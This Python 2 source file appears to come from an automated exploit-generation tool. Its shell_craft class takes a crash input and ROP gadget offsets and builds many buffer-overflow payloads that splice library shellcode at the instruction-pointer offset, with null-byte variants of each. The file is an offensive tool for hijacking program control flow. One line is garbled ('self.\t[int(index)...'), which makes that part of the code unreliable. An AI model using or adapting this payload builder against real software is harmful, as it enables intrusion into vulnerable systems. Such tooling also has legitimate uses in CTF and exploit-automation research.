from pwn import *
import os
import sys
import pycurl
import StringIO
from urllib import urlencode
import json
from roputils import *
from pwn import *
from resource import setrlimit, RLIMIT_CORE,RLIM_INFINITY
from config import shellcode_lib
defaultencoding = 'ascii'
if sys.getdefaultencoding() != defaultencoding:
    reload(sys)
    sys.setdefaultencoding(defaultencoding)


class shell_craft():
    def __init__(self, binary, crash	, rop_and_index, info):
        self.binary = binary
        self.crash = crash
        self.info = info
        self.rop_and_index = rop_and_index
        self.payload = []

    def create_payload(self):
        for shellcode in shellcode_lib:
            for rop,index in self.rop_and_index.items():
                if 'direct_call' in rop:
                    #print 'direct_call shellcraft'
                    self.payload.append(self.crash[0:int(index)] + shellcode + self.crash[int(index)+len(shellcode):])
                    self.payload.append(self.crash[0:1] + '\x00' + self.crash[2:int(index)] + shellcode + self.	[int(index)+len(shellcode):])
                else:
                    reg = rop.split(',')[1]
                    rop = rop.split(',')[0]
                    if reg == 'esp':
                        if len(shellcode) + int(index) <= len(self.crash):
                            self.payload.append(self.crash[0:int(index)-4] + rop + shellcode + self.crash[int(index)+len(shellcode):])
                            self.payload.append(self.crash[0:1] + '\x00' + self.crash[2:int(index)-4] + rop + shellcode + self.crash[int(index)+len(shellcode):])
                        else:
                            self.payload.append(self.crash[0:int(index)-4] + rop + shellcode)
                            self.payload.append(self.crash[0:1] + '\x00' + self.crash[2:int(index)-4] + rop + shellcode)
                    else:
                        i = 0
                        if len(shellcode) + int(index) <= len(self.crash):
                            shellcode_tmp = self.crash[0:int(index)] + shellcode + self.crash[int(index)+len(shellcode):]
                        else:
                            shellcode_tmp = self.crash[0:int(index)] + shellcode
                        while(1):
                            i = shellcode_tmp.find(self.info['eip'], i)
                            if i < 0:
                                break
                            self.payload.append(shellcode_tmp[0:i] + rop + shellcode_tmp[i+4:])
                            self.payload.append(shellcode_tmp[0:1] + '\x00' + shellcode_tmp[2:i] + rop + shellcode_tmp[i+4:])
                            i += 1
        log.info('Total payload: ' + str(len(self.payload)))
        return self.payload


